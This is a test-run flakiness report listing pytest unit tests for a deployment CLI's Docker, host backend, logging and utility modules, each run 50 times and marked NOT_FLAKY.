tests/unit_tests/test_deploy_helpers.py::TestResolvePushedImageDigest::test_happy_path_returns_digest,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestResolvePushedImageDigest::test_no_matching_repo_falls_back_with_warning,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestResolvePushedImageDigest::test_null_repodigests_falls_back_with_warning,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestResolvePushedImageDigest::test_registry_with_port_in_host,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestSmithDashboardBaseUrl::test_127_0_0_1,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestSmithDashboardBaseUrl::test_dev_host_url,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestSmithDashboardBaseUrl::test_empty_returns_default,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestSmithDashboardBaseUrl::test_eu_host_url,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestSmithDashboardBaseUrl::test_localhost,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestSmithDashboardBaseUrl::test_localhost_trailing_slash,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestSmithDashboardBaseUrl::test_none_returns_default,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestSmithDashboardBaseUrl::test_prod_host_url,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestSmithDashboardBaseUrl::test_staging_host_url,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestSmithDashboardBaseUrl::test_unknown_domain_returns_default,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestValidatePrebuiltImage::test_accepts_linux_amd64,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestValidatePrebuiltImage::test_missing_docker_binary_raises_actionable_error,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestValidatePrebuiltImage::test_missing_image_raises_actionable_error,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestValidatePrebuiltImage::test_rejects_non_amd64_platform,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_docker.py::test_compose_combined_mode_has_no_n_jobs,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_docker.py::test_compose_distributed_mode_with_custom_db,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_docker.py::test_compose_distributed_mode_with_default_db,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_docker.py::test_compose_with_api_version,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_docker.py::test_compose_with_api_version_and_base_image,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_docker.py::test_compose_with_api_version_and_debugger,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_docker.py::test_compose_with_debugger_and_custom_db,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_docker.py::test_compose_with_debugger_and_default_db,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_docker.py::test_compose_with_no_debugger_and_custom_db,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_docker.py::test_compose_with_no_debugger_and_custom_db_with_healthcheck,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_docker.py::test_parse_version_w_edge_cases[1-expected6],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_docker.py::test_parse_version_w_edge_cases[1.2-expected5],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_docker.py::test_parse_version_w_edge_cases[1.2.3+1-expected3],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_docker.py::test_parse_version_w_edge_cases[1.2.3-alpha+build-expected4],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_docker.py::test_parse_version_w_edge_cases[1.2.3-alpha-expected2],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_docker.py::test_parse_version_w_edge_cases[1.2.3-expected0],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_docker.py::test_parse_version_w_edge_cases[2.0.0-beta.1+exp.sha.5114f85-expected8],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_docker.py::test_parse_version_w_edge_cases[v1.2.3-expected1],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_docker.py::test_parse_version_w_edge_cases[v28.1.1+1-expected7],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_docker.py::test_parse_version_w_edge_cases[v3.4.5-rc1+build.123-expected9],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_host_backend.py::test_constructor_empty_url_raises,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_host_backend.py::test_constructor_strips_trailing_slash,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_host_backend.py::test_create_deployment,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_host_backend.py::test_delete_deployment,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_host_backend.py::test_get_build_logs,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_host_backend.py::test_get_deploy_logs_all_revisions,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_host_backend.py::test_get_deploy_logs_specific_revision,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_host_backend.py::test_get_deployment,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_host_backend.py::test_get_revision,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_host_backend.py::test_list_deployments,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_host_backend.py::test_list_deployments_sends_query_params,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_host_backend.py::test_list_revisions,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_host_backend.py::test_request_empty_body_returns_none,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_host_backend.py::test_request_http_error_raises,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_host_backend.py::test_request_invalid_json_raises,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_host_backend.py::test_request_push_token,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_host_backend.py::test_request_sends_headers,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_host_backend.py::test_request_sends_json_payload,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_host_backend.py::test_request_transport_error_raises,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_host_backend.py::test_update_deployment,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_host_backend.py::test_update_deployment_forwards_tracked_packages,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_host_backend.py::test_update_deployment_internal_source_forwards_tracked_packages,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_host_backend.py::test_update_deployment_internal_source_omits_tracked_packages_when_absent,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_host_backend.py::test_update_deployment_no_secrets,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_host_backend.py::test_update_deployment_omits_tracked_packages_when_absent,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_logs_helpers.py::TestFormatLogEntry::test_empty_entry,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestNormalizeImageTag::test_invalid_chars_raises,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_logs_helpers.py::TestFormatLogEntry::test_full_entry_epoch,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_logs_helpers.py::TestFormatLogEntry::test_full_entry_string,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_logs_helpers.py::TestFormatLogEntry::test_no_level,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_logs_helpers.py::TestFormatLogEntry::test_no_timestamp,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_logs_helpers.py::TestFormatTimestamp::test_empty,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_logs_helpers.py::TestFormatTimestamp::test_epoch_ms,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_logs_helpers.py::TestFormatTimestamp::test_none,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_logs_helpers.py::TestFormatTimestamp::test_string_passthrough,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_logs_helpers.py::TestLevelFg::test_empty_returns_none,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_logs_helpers.py::TestLevelFg::test_error,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_logs_helpers.py::TestLevelFg::test_error_lowercase,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_logs_helpers.py::TestLevelFg::test_info_returns_none,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_logs_helpers.py::TestLevelFg::test_warning,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_util.py::test_clean_empty_lines,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_util.py::test_extract_deployment_url_defaults_to_dash,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_util.py::test_extract_deployment_url_uses_custom_url,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_util.py::test_format_deployments_table,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_util.py::test_format_revisions_table,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_util.py::test_warn_non_wolfi_distro_output_formatting,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_util.py::test_warn_non_wolfi_distro_return_value,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_util.py::test_warn_non_wolfi_distro_with_debian,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_util.py::test_warn_non_wolfi_distro_with_default_debian,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_util.py::test_warn_non_wolfi_distro_with_other_distro,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_util.py::test_warn_non_wolfi_distro_with_wolfi,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_dockerfile_command_with_docker_compose,50,0,0,50,NOT_FLAKY
